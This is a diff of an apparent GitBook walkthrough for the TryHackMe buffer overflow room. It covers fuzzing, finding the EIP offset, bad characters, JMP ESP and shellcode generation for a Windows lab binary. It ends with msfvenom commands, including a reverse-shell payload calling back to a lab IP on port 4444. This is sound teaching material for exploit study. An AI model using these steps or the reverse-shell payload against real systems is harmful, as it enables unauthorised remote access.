@@ -14,7 +14,6 @@ For this section I will be using the buffer overflow room from TryHackMe. Good r
 
 Before starting, I have some scripts that would help the exploit process a lot. One for fuzzing and finding when the program crashes, and the next for the actual exploit itself.
 
-{% code title="fuzzer.py" overflow="wrap" %}
 ```python
 #!/usr/bin/python
 import time, struct, sys
@@ -54,7 +53,6 @@ for string in buff:
         print "[!] connection refused, check debugger"
         sys(exit)
 ```
-{% endcode %}
 
 <pre class="language-python" data-title="exploit.py" data-overflow="wrap"><code class="lang-python">#!/usr/bin/python2
 
@@ -117,7 +115,7 @@ Lastly, you would need to have **Immunity Debugger on a Windows VM** for this be
 
 We would first need to set up mona's working directory (where all the files it generates goes) as such:
 
-<figure><img src="../.gitbook/assets/image (2498).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/image%20(2498).png>)
 
 You can download `mona.py` from here:
 
@@ -127,11 +125,11 @@ You can download `mona.py` from here:
 
 First we need to fuzz the application to test at what character it will crash at. For OVERFLOW 2 of this room, it was after 700 bytes of data were sent.
 
-<figure><img src="../.gitbook/assets/image (1592).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/image%20(1592).png>)
 
 If we take a look at Immunity Debugger, the register window would look like this:
 
-<figure><img src="../.gitbook/assets/image (2742).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/image%20(2742).png>)
 
 The EIP is filled with \x41 (which translates back to "A"). So the program would crash and we need to reload this in Immunity Debugger a lot.
 
@@ -139,15 +137,15 @@ The EIP is filled with \x41 (which translates back to "A"). So the program would
 
 When finding the offset, we need to use `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb`, which is a script that would create a string of text for us to send again.
 
-<figure><img src="../.gitbook/assets/image (3325).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/image%20(3325).png>)
 
 Once generated, replace the `pattern` parameter in `exploit.py`. Then, run the script and resend the buffer. Since the goal is to control the EIP to go wherever we want, we would need to take note of the value of the EIP when we send the pattern.
 
-<figure><img src="../.gitbook/assets/image (2291).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/image%20(2291).png>)
 
 Then, we can use `pattern_offset.rb`, which is located in the same folder to find the exact offset that we need.
 
-<figure><img src="../.gitbook/assets/image (1033).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/image%20(1033).png>)
 
 ## Finding Bad Characters
 
@@ -159,13 +157,13 @@ We can use `mona.py` from Immunity Debugger to first generate a `bytearray.bin` 
 
 Afterwards, fill in the exploit with the offset number and send the bad characters along with it. The program would crash, and we need to view the **values on the stack**.
 
-<figure><img src="../.gitbook/assets/image (929).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/image%20(929).png>)
 
 Notice that the characters for 'A' ends, and then some special characters begin from there. In this case, the address is at `0x00e2fa18`. This is the address we need to start comparing from, because that's where the **bad characters that we sent in begins**.
 
 We can use `mona.py` to do so again, through `!mona compare -f C:\path\to\bytearray.bin -a 00e2fa18`. This would compare the characters from the bytearray we generated to the address of the stack at that value.
 
-<figure><img src="../.gitbook/assets/image (2342).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/image%20(2342).png>)
 
 So the bad characters are highlighted in this case. Before removing all of them, **take note that one bad character can sometimes cause the next byte to be corrupted**. For example, \x23 is a bad character, and causes \x24 to also become corrupted, but \x24 is not a bad character we need to avoid.
 
@@ -173,7 +171,7 @@ So the bad characters so far are `\x00\x23\x3c\x83\xba`. Update the bad characte
 
 Take note that the address **can change, so look at the values of the stack to know where to start comparing from**. If we have successfully removed all bad characters, the output from the comparison would look like this:
 
-<figure><img src="../.gitbook/assets/image (518).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/image%20(518).png>)
 
 If not, there would still be bad characters present, and we need to **repeat the process until the status is unmodified.**
 
@@ -183,7 +181,7 @@ Now, we need to find a `JMP ESP` instruction. The reason we need this is because
 
 We can do this with Mona, and this can be done whether the binary is running or crashed. We have to run `!mona jmp -r esp -b "\x00\x23\3c\x83\xba"` to find this instruction.
 
-<figure><img src="../.gitbook/assets/image (1835).png" alt=""><figcaption></figcaption></figure>
+![](<../.gitbook/assets/image%20(1835).png>)
 
 There are quite a few to choose from, and I chose `\x62\x50\x12\x05`, which would work fine with our payload. When putting this address in, **take note to reverse it as we are working with a 32-bit machine**. This would mean that it is a **little-endian** arrangement. So in our exploit, we need to write the new value of the EIP as `\x05\x12\x50\x62`.
 
@@ -193,13 +191,11 @@ We can proceed with generating shellcode. This can be done through `msfvenom` an
 
 For this binary, I wanted to spawn the calculator. The command to generate this is:
 
-{% code overflow="wrap" %}
 ```bash
 msfvenom -p windows/exec CMD=calc.exe -b "x00\x23\x3c\x83\xba" -f c -v payload # for calculator
 
 msfvenom -p windows/shell_reverse_tcp LHOST=10.4.67.186 LPORT=4444 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f c -v payload # for reverse shell
 ```
-{% endcode %}
 
 Then, we can load the shellcode into our exploit. Then, make sure to include some NOP instructions to allow for some space for our shellcode to execute. I have included 16 bytes of NOP instructions within the `exploit.py` script.
 
